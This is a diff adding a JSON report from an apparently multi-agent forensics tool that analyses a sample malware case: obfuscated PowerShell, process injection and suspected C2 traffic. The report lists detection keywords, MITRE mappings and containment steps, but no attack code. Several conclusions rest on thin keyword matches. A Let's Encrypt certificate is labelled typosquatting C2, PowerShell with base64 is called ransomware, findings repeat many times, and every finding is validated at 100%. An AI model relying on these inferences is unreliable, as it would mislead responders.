+          "triggered_by": "zeek_network.log"
+        }
+      ],
+      "timeline": [
+        {
+          "agent": "TriageAgent",
+          "type": "evidence_detected",
+          "timestamp": "2026-05-23T02:57:49.918493+00:00",
+          "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.log"
+        },
+        {
+          "agent": "TriageAgent",
+          "type": "evidence_detected",
+          "timestamp": "2026-05-23T02:57:49.918575+00:00",
+          "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json"
+        },
+        {
+          "agent": "TriageAgent",
+          "type": "dynamic_priority_escalation",
+          "timestamp": "2026-05-23T02:57:49.919603+00:00",
+          "artifact": "triage_scan"
+        },
+        {
+          "agent": "LogAgent",
+          "type": "suspicious_log_activity",
+          "timestamp": "2026-05-23T02:57:50.504653+00:00",
+          "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json"
+        },
+        {
+          "agent": "LogAgent",
+          "type": "suspicious_log_activity",
+          "timestamp": "2026-05-23T02:57:51.104947+00:00",
+          "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_injection.json"
+        },
+        {
+          "agent": "LogAgent",
+          "type": "suspicious_log_activity",
+          "timestamp": "2026-05-23T02:57:51.735080+00:00",
+          "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.json"
+        },
+        {
+          "agent": "MemoryAgent",
+          "type": "suspicious_process_tree",
+          "timestamp": "2026-05-23T02:57:52.064580+00:00",
+          "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json"
+        },
+        {
+          "agent": "MemoryAgent",
+          "type": "suspicious_process_tree",
+          "timestamp": "2026-05-23T02:57:52.065012+00:00",
+          "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.log"
+        },
+        {
+          "agent": "NetworkAgent",
+          "type": "tls_anomaly",
+          "timestamp": "2026-05-23T02:57:52.074401+00:00",
+          "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.json"
+        },
+        {
+          "agent": "NetworkAgent",
+          "type": "tls_anomaly",
+          "timestamp": "2026-05-23T02:57:52.075741+00:00",
+          "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.log"
+        }
+      ],
+      "threat_assessment": {
+        "score": 100,
+        "level": "CRITICAL",
+        "reasons": [
+          "Base pattern score: 97",
+          "Temporal chain multiplier x3.5: 97 -> 100",
+          "Temporal chain multiplier x3.5: 100 -> 100",
+          "Temporal chain multiplier x3.5: 100 -> 100",
+          "Temporal chain multiplier x3.5: 100 -> 100",
+          "3 patterns detected (+10)",
+          "Correlated IPs (+5)"
+        ]
+      },
+      "attack_narrative": "A heavily obfuscated PowerShell command was executed on A1B2C3D4-E5F6 (ProcessID 1128) using ExecutionPolicy Bypass and WindowStyle Hidden flags, indicating a fileless malware execution technique designed to evade endpoint detection. The malicious process injected shellcode into a legitimate system process (GrantedAccess=0x1FFFFF) \u2014 this is PROCESS_ALL_ACCESS, a definitive indicator of process injection used to achieve execution within a trusted process and bypass security monitoring. The attack chain represents a complete APT intrusion lifecycle: obfuscated execution, process injection for persistence, and beaconing to external C2 infrastructure \u2014 consistent with a Cobalt Strike or similar commercial implant deployment.",
+      "containment_actions": [
+        "BLOCK IP 104.21.55.12 at perimeter firewall and all internal segment boundaries",
+        "BLOCK IP 192.168.1.105 at perimeter firewall and all internal segment boundaries",
+        "ISOLATE host A1B2C3D4-E5F6 immediately \u2014 disconnect from all network segments",
+        "ISOLATE host DESKTOP-DEV immediately \u2014 disconnect from all network segments",
+        "ISOLATE host DESKTOP-DEV-99A immediately \u2014 disconnect from all network segments",
+        "KILL all suspicious process trees \u2014 terminate injected processes",
+        "DUMP memory of svchost.exe instances for forensic analysis",
+        "ENABLE PowerShell ScriptBlock logging (Event 4104) across all endpoints",
+        "ENFORCE Constrained Language Mode for PowerShell enterprise-wide",
+        "REVIEW Windows Defender AMSI logs for bypass attempts",
+        "DEPLOY EDR memory scanning across all endpoints immediately",
+        "ENABLE Windows Credential Guard to prevent credential extraction",
+        "REVIEW all TLS connections \u2014 audit certificate issuers for anomalies",
+        "BLOCK all outbound connections to domains with mismatched certificate issuers",
+        "REVIEW all TLS connections \u2014 audit certificate issuers for anomalies",
+        "BLOCK all outbound connections to domains with mismatched certificate issuers",
+        "REVIEW all TLS connections \u2014 audit certificate issuers for anomalies",
+        "BLOCK all outbound connections to domains with mismatched certificate issuers",
+        "REVIEW all TLS connections \u2014 audit certificate issuers for anomalies",
+        "BLOCK all outbound connections to domains with mismatched certificate issuers",
+        "REVIEW all TLS connections \u2014 audit certificate issuers for anomalies",
+        "BLOCK all outbound connections to domains with mismatched certificate issuers",
+        "REVIEW all TLS connections \u2014 audit certificate issuers for anomalies",
+        "BLOCK all outbound connections to domains with mismatched certificate issuers",
+        "REVIEW all TLS connections \u2014 audit certificate issuers for anomalies",
+        "BLOCK all outbound connections to domains with mismatched certificate issuers",
+        "REVIEW all TLS connections \u2014 audit certificate issuers for anomalies",
+        "BLOCK all outbound connections to domains with mismatched certificate issuers",
+        "PRESERVE all Sysmon, network, and endpoint logs for legal/forensic proceedings",
+        "NOTIFY CISO and legal team \u2014 assess breach notification obligations"
+      ],
+      "findings": [
+        {
+          "type": "attack_pattern",
+          "pattern": "RANSOMWARE_OR_MALWARE",
+          "confidence": "CRITICAL",
+          "evidence_keywords": [
+            "powershell",
+            "base64"
+          ],
+          "description": "Malware or ransomware execution detected",
+          "mitre_technique": "T1486 - Data Encrypted for Impact",
+          "base_score": 90,
+          "agent": "CorrelationAgent",
+          "iteration": 1,
+          "timestamp": "2026-05-23T02:57:52.082949+00:00",
+          "traceable": true
+        },
+        {
+          "type": "attack_pattern",
+          "pattern": "PROCESS_INJECTION",
+          "confidence": "CRITICAL",
+          "evidence_keywords": [
+            "0x1FFFFF"
+          ],
+          "description": "Process injection confirmed via GrantedAccess=0x1FFFFF",
+          "mitre_technique": "T1055 - Process Injection",
+          "base_score": 97,
+          "agent": "CorrelationAgent",
+          "iteration": 1,
+          "timestamp": "2026-05-23T02:57:52.083035+00:00",
+          "traceable": true
+        },
+        {
+          "type": "attack_pattern",
+          "pattern": "POWERSHELL_OBFUSCATION",
+          "confidence": "CRITICAL",
+          "evidence_keywords": [
+            "hidden",
+            "windowstyle",
+            "executionpolicy",
+            "bypass"
+          ],
+          "description": "Obfuscated PowerShell execution with stealth flags",
+          "mitre_technique": "T1059.001 - PowerShell / T1027 - Obfuscation",
+          "base_score": 90,
+          "agent": "CorrelationAgent",
+          "iteration": 1,
+          "timestamp": "2026-05-23T02:57:52.083093+00:00",
+          "traceable": true
+        },
+        {
+          "type": "temporal_sequence",
+          "pattern": "FULL_INJECTION_CHAIN",
+          "confidence": "CRITICAL",
+          "description": "Execution -> Process Injection -> Remote Thread -> C2 Beacon within time window",
+          "mitre_technique": "T1055 - Process Injection / T1071 - C2 Communication",
+          "events": [
+            "EventID:1 Process Execution",
+            "EventID:10 Process Access",
+            "EventID:8 Remote Thread Creation",
+            "Network C2 Beacon"
+          ],
+          "base_score": 97,
+          "multiplier": 3.5,
+          "agent": "CorrelationAgent",
+          "iteration": 1,
+          "timestamp": "2026-05-23T02:57:52.083127+00:00",
+          "traceable": true
+        },
+        {
+          "type": "temporal_sequence",
+          "pattern": "FULL_INJECTION_CHAIN",
+          "confidence": "CRITICAL",
+          "description": "Execution -> Process Injection -> Remote Thread -> C2 Beacon within time window",
+          "mitre_technique": "T1055 - Process Injection / T1071 - C2 Communication",
+          "events": [
+            "EventID:1 Process Execution",
+            "EventID:10 Process Access",
+            "EventID:8 Remote Thread Creation",
+            "Network C2 Beacon"
+          ],
+          "base_score": 97,
+          "multiplier": 3.5,
+          "agent": "CorrelationAgent",
+          "iteration": 1,
+          "timestamp": "2026-05-23T02:57:52.083158+00:00",
+          "traceable": true
+        },
+        {
+          "type": "temporal_sequence",
+          "pattern": "FULL_INJECTION_CHAIN",
+          "confidence": "CRITICAL",
+          "description": "Execution -> Process Injection -> Remote Thread -> C2 Beacon within time window",
+          "mitre_technique": "T1055 - Process Injection / T1071 - C2 Communication",
+          "events": [
+            "EventID:1 Process Execution",
+            "EventID:10 Process Access",
+            "EventID:8 Remote Thread Creation",
+            "Network C2 Beacon"
+          ],
+          "base_score": 97,
+          "multiplier": 3.5,
+          "agent": "CorrelationAgent",
+          "iteration": 1,
+          "timestamp": "2026-05-23T02:57:52.083190+00:00",
+          "traceable": true
+        },
+        {
+          "type": "temporal_sequence",
+          "pattern": "FULL_INJECTION_CHAIN",
+          "confidence": "CRITICAL",
+          "description": "Execution -> Process Injection -> Remote Thread -> C2 Beacon within time window",
+          "mitre_technique": "T1055 - Process Injection / T1071 - C2 Communication",
+          "events": [
+            "EventID:1 Process Execution",
+            "EventID:10 Process Access",
+            "EventID:8 Remote Thread Creation",
+            "Network C2 Beacon"
+          ],
+          "base_score": 97,
+          "multiplier": 3.5,
+          "agent": "CorrelationAgent",
+          "iteration": 1,
+          "timestamp": "2026-05-23T02:57:52.083222+00:00",
+          "traceable": true
+        },
+        {
+          "type": "ip_seen_in_evidence",
+          "ip": "104.21.55.12",
+          "seen_by_agents": [
+            "LogAgent"
+          ],
+          "significance": "HIGH",
+          "description": "Regex-verified IoC: 104.21.55.12",
+          "agent": "CorrelationAgent",
+          "iteration": 1,
+          "timestamp": "2026-05-23T02:57:52.083246+00:00",
+          "traceable": true
+        },
+        {
+          "type": "ip_seen_in_evidence",
+          "ip": "192.168.1.105",
+          "seen_by_agents": [
+            "LogAgent"
+          ],
+          "significance": "HIGH",
+          "description": "Regex-verified IoC: 192.168.1.105",
+          "agent": "CorrelationAgent",
+          "iteration": 1,
+          "timestamp": "2026-05-23T02:57:52.083255+00:00",
+          "traceable": true
+        }
+      ],
+      "errors": [],
+      "timestamp": "2026-05-23T02:57:52.083684+00:00"
+    },
+    "correction": {
+      "status": "COMPLETE",
+      "agent": "CorrectionAgent",
+      "validated_findings": [
+        {
+          "finding": {
+            "type": "evidence_detected",
+            "category": "log_files",
+            "count": 3,
+            "files": [
+              "sysmon_execution.log",
+              "sysmon_injection.log",
+              "zeek_network.log"
+            ],
+            "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.log",
+            "agent": "TriageAgent",
+            "iteration": 1,
+            "timestamp": "2026-05-23T02:57:49.918493+00:00",
+            "traceable": true
+          },
+          "source_agent": "TriageAgent",
+          "valid": true,
+          "confidence": 70,
+          "issues": [],
+          "verification_steps": [
+            "Artifact verified: sysmon_execution.log",
+            "File on disk: sysmon_execution.log",
+            "Timestamp present"
+          ]
+        },
+        {
+          "finding": {
+            "type": "evidence_detected",
+            "category": "json_artifacts",
+            "count": 3,
+            "files": [
+              "sysmon_execution.json",
+              "sysmon_injection.json",
+              "zeek_network.json"
+            ],
+            "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json",
+            "agent": "TriageAgent",
+            "iteration": 1,
+            "timestamp": "2026-05-23T02:57:49.918575+00:00",
+            "traceable": true
+          },
+          "source_agent": "TriageAgent",
+          "valid": true,
+          "confidence": 70,
+          "issues": [],
+          "verification_steps": [
+            "Artifact verified: sysmon_execution.json",
+            "File on disk: sysmon_execution.json",
+            "Timestamp present"
+          ]
+        },
+        {
+          "finding": {
+            "type": "dynamic_priority_escalation",
+            "reason": "Critical keywords found in evidence",
+            "keywords": [
+              "powershell",
+              "executionpolicy bypass",
+              "windowstyle hidden",
+              "base64",
+              "0x1fffff"
+            ],
+            "artifact": "triage_scan",
+            "priority_set": "CRITICAL",
+            "agent": "TriageAgent",
+            "iteration": 1,
+            "timestamp": "2026-05-23T02:57:49.919603+00:00",
+            "traceable": true
+          },
+          "source_agent": "TriageAgent",
+          "valid": true,
+          "confidence": 70,
+          "issues": [],
+          "verification_steps": [
+            "Triage-level finding \u2014 acceptable",
+            "Timestamp present"
+          ]
+        },
+        {
+          "finding": {
+            "type": "suspicious_log_activity",
+            "file": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json",
+            "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json",
+            "file_hash": "619304a909d0de9741ac108a2ac53e2d366788677f5f7b66c59bdd492bb6a786",
+            "keywords_matched": [
+              "powershell",
+              "base64",
+              "executionpolicy",
+              "windowstyle",
+              "hidden",
+              "bypass",
+              "wmi"
+            ],
+            "total_hits": 8,
+            "agent": "LogAgent",
+            "iteration": 1,
+            "timestamp": "2026-05-23T02:57:50.504653+00:00",
+            "traceable": true
+          },
+          "source_agent": "LogAgent",
+          "valid": true,
+          "confidence": 100,
+          "issues": [],
+          "verification_steps": [
+            "Artifact verified: sysmon_execution.json",
+            "File on disk: sysmon_execution.json",
+            "Keywords: ['powershell', 'base64', 'executionpolicy', 'windowstyle', 'hidden', 'bypass', 'wmi']",
+            "Timestamp present"
+          ]
+        },
+        {
+          "finding": {
+            "type": "suspicious_log_activity",
+            "file": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_injection.json",
+            "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_injection.json",
+            "file_hash": "670fa5d537a5337b60c444b935c93dbcb1129f404bcd8fef7d95d15b19246d00",
+            "keywords_matched": [
+              "powershell",
+              "0x1fffff",
+              "svchost"
+            ],
+            "total_hits": 5,
+            "agent": "LogAgent",
+            "iteration": 1,
+            "timestamp": "2026-05-23T02:57:51.104947+00:00",
+            "traceable": true
+          },
+          "source_agent": "LogAgent",
+          "valid": true,
+          "confidence": 100,
+          "issues": [],
+          "verification_steps": [
+            "Artifact verified: sysmon_injection.json",
+            "File on disk: sysmon_injection.json",
+            "Keywords: ['powershell', '0x1fffff', 'svchost']",
+            "Timestamp present"
+          ]
+        },
+        {
+          "finding": {
+            "type": "suspicious_log_activity",
+            "file": "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.json",
+            "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.json",
+            "file_hash": "a1f2ebf54ab8ff4069e38a67cf5e34e1fcec121526753060a5dc2fbcee5fbea1",
+            "keywords_matched": [
+              "let's encrypt"
+            ],
+            "total_hits": 1,
+            "agent": "LogAgent",
+            "iteration": 1,
+            "timestamp": "2026-05-23T02:57:51.735080+00:00",
+            "traceable": true
+          },
+          "source_agent": "LogAgent",
+          "valid": true,
+          "confidence": 100,
+          "issues": [],
+          "verification_steps": [
+            "Artifact verified: zeek_network.json",
+            "File on disk: zeek_network.json",
+            "Keywords: [\"let's encrypt\"]",
+            "Timestamp present"
+          ]
+        },
+        {
+          "finding": {
+            "type": "suspicious_process_tree",
+            "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json",
+            "file_hash": "619304a909d0de97",
+            "parent": "wmiprvse.exe",
+            "child": "powershell.exe",
+            "pair": "wmiprvse.exe -> powershell.exe",
+            "severity": "HIGH",
+            "mitre": "T1059 - Command and Scripting Interpreter",
+            "agent": "MemoryAgent",
+            "iteration": 1,
+            "timestamp": "2026-05-23T02:57:52.064580+00:00",
+            "traceable": true
+          },
+          "source_agent": "MemoryAgent",
+          "valid": true,
+          "confidence": 70,
+          "issues": [],
+          "verification_steps": [
+            "Artifact verified: sysmon_execution.json",
+            "File on disk: sysmon_execution.json",
+            "Timestamp present"
+          ]
+        },
+        {
+          "finding": {
+            "type": "suspicious_process_tree",
+            "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.log",
+            "file_hash": "619304a909d0de97",
+            "parent": "wmiprvse.exe",
+            "child": "powershell.exe",
+            "pair": "wmiprvse.exe -> powershell.exe",
+            "severity": "HIGH",
+            "mitre": "T1059 - Command and Scripting Interpreter",
+            "agent": "MemoryAgent",
+            "iteration": 1,
+            "timestamp": "2026-05-23T02:57:52.065012+00:00",
+            "traceable": true
+          },
+          "source_agent": "MemoryAgent",
+          "valid": true,
+          "confidence": 70,
+          "issues": [],
+          "verification_steps": [
+            "Artifact verified: sysmon_execution.log",
+            "File on disk: sysmon_execution.log",
+            "Timestamp present"
+          ]
+        },
+        {
+          "finding": {
+            "type": "tls_anomaly",
+            "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.json",
+            "file_hash": "a1f2ebf54ab8ff40",
+            "indicator": "let's encrypt",
+            "evidence": [
+              "\"issuer\": \"CN=Let's Encrypt Authority X3, O=Let's Encrypt, C=US\","
+            ],
+            "severity": "HIGH",
+            "mitre": "T1071.001 - Web Protocols / T1568 - Dynamic Resolution",
+            "agent": "NetworkAgent",
+            "iteration": 1,
+            "timestamp": "2026-05-23T02:57:52.074401+00:00",
+            "traceable": true
+          },
+          "source_agent": "NetworkAgent",
+          "valid": true,
+          "confidence": 70,
+          "issues": [],
+          "verification_steps": [
+            "Artifact verified: zeek_network.json",
+            "File on disk: zeek_network.json",
+            "Timestamp present"
+          ]
+        },
+        {
+          "finding": {
+            "type": "tls_anomaly",
+            "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.log",
+            "file_hash": "a1f2ebf54ab8ff40",
+            "indicator": "let's encrypt",
+            "evidence": [
+              "\"issuer\": \"CN=Let's Encrypt Authority X3, O=Let's Encrypt, C=US\","
+            ],
+            "severity": "HIGH",
+            "mitre": "T1071.001 - Web Protocols / T1568 - Dynamic Resolution",
+            "agent": "NetworkAgent",
+            "iteration": 1,
+            "timestamp": "2026-05-23T02:57:52.075741+00:00",
+            "traceable": true
+          },
+          "source_agent": "NetworkAgent",
+          "valid": true,
+          "confidence": 70,
+          "issues": [],
+          "verification_steps": [
+            "Artifact verified: zeek_network.log",
+            "File on disk: zeek_network.log",
+            "Timestamp present"
+          ]
+        },
+        {
+          "pattern": "RANSOMWARE_OR_MALWARE",
+          "valid": true,
+          "confidence": 100,
+          "issues": [],
+          "verification_steps": [
+            "Supported by: ['powershell', 'base64']",
+            "MITRE: T1486 - Data Encrypted for Impact"
+          ]
+        },
+        {
+          "pattern": "PROCESS_INJECTION",
+          "valid": true,
+          "confidence": 100,
+          "issues": [],
+          "verification_steps": [
+            "Supported by: ['0x1FFFFF']",
+            "MITRE: T1055 - Process Injection"
+          ]
+        },
+        {
+          "pattern": "POWERSHELL_OBFUSCATION",
+          "valid": true,
+          "confidence": 100,
+          "issues": [],
+          "verification_steps": [
+            "Supported by: ['hidden', 'windowstyle', 'executionpolicy', 'bypass']",
+            "MITRE: T1059.001 - PowerShell / T1027 - Obfuscation"
+          ]
+        },
+        {
+          "ip": "104.21.55.12",
+          "valid": true,
+          "confidence": 90,
+          "issue": null
+        },
+        {
+          "ip": "192.168.1.105",
+          "valid": true,
+          "confidence": 90,
+          "issue": null
+        },
+        {
+          "type": "high_signal_signature",
+          "description": "PROCESS_ALL_ACCESS on system process \u2014 definitive process injection",
+          "mitre": "T1055 - Process Injection",
+          "score": 95,
+          "valid": true,
+          "confidence": 95
+        },
+        {
+          "type": "high_signal_signature",
+          "description": "PowerShell stealth execution flags \u2014 malware loader signature",
+          "mitre": "T1059.001 - PowerShell",
+          "score": 88,
+          "valid": true,
+          "confidence": 88
+        },
+        {
+          "type": "high_signal_signature",
+          "description": "TLS cert issued by Let's Encrypt for Microsoft-named domain \u2014 typosquatting C2",
+          "mitre": "T1071.001 - Web Protocols / T1568 - Dynamic Resolution",
+          "score": 92,
+          "valid": true,
+          "confidence": 92
+        },
+        {
+          "type": "high_signal_signature",
+          "description": "TLS cert issued by Let's Encrypt for Microsoft-named domain \u2014 typosquatting C2",
+          "mitre": "T1071.001 - Web Protocols / T1568 - Dynamic Resolution",
+          "score": 92,
+          "valid": true,
+          "confidence": 92
+        },
+        {
+          "type": "high_signal_signature",
+          "description": "TLS cert issued by Let's Encrypt for Microsoft-named domain \u2014 typosquatting C2",
+          "mitre": "T1071.001 - Web Protocols / T1568 - Dynamic Resolution",
+          "score": 92,
+          "valid": true,
+          "confidence": 92
+        },
+        {
+          "type": "high_signal_signature",
+          "description": "TLS cert issued by Let's Encrypt for Microsoft-named domain \u2014 typosquatting C2",
+          "mitre": "T1071.001 - Web Protocols / T1568 - Dynamic Resolution",
+          "score": 92,
+          "valid": true,
+          "confidence": 92
+        },
+        {
+          "type": "high_signal_signature",
+          "description": "TLS cert issued by Let's Encrypt for Microsoft-named domain \u2014 typosquatting C2",
+          "mitre": "T1071.001 - Web Protocols / T1568 - Dynamic Resolution",
+          "score": 92,
+          "valid": true,
+          "confidence": 92
+        },
+        {
+          "type": "high_signal_signature",
+          "description": "TLS cert issued by Let's Encrypt for Microsoft-named domain \u2014 typosquatting C2",
+          "mitre": "T1071.001 - Web Protocols / T1568 - Dynamic Resolution",
+          "score": 92,
+          "valid": true,
+          "confidence": 92
+        },
+        {
+          "type": "high_signal_signature",
+          "description": "TLS cert issued by Let's Encrypt for Microsoft-named domain \u2014 typosquatting C2",
+          "mitre": "T1071.001 - Web Protocols / T1568 - Dynamic Resolution",
+          "score": 92,
+          "valid": true,
+          "confidence": 92
+        },
+        {
+          "type": "high_signal_signature",
+          "description": "TLS cert issued by Let's Encrypt for Microsoft-named domain \u2014 typosquatting C2",
+          "mitre": "T1071.001 - Web Protocols / T1568 - Dynamic Resolution",
+          "score": 92,
+          "valid": true,
+          "confidence": 92
+        }
+      ],
+      "rejected_findings": [],
+      "warnings": [],
+      "summary": {
+        "total_findings_reviewed": 25,
+        "validated": 25,
+        "rejected": 0,
+        "warnings": 0,
+        "accuracy_rate": 100.0,
+        "overall_confidence": "HIGH",
+        "devil_advocate_issues": [],
+        "devil_advocate_suggestions": [],
+        "forced_reeval": false,
+        "auto_remediated_patterns": [],
+        "auto_remediation_count": 0
+      },
+      "errors": [],
+      "timestamp": "2026-05-23T02:57:52.321351+00:00"
+    }
+  },
+  "timestamp": "2026-05-23T02:57:52.324008+00:00",
+  "duration_seconds": 2.49
+}
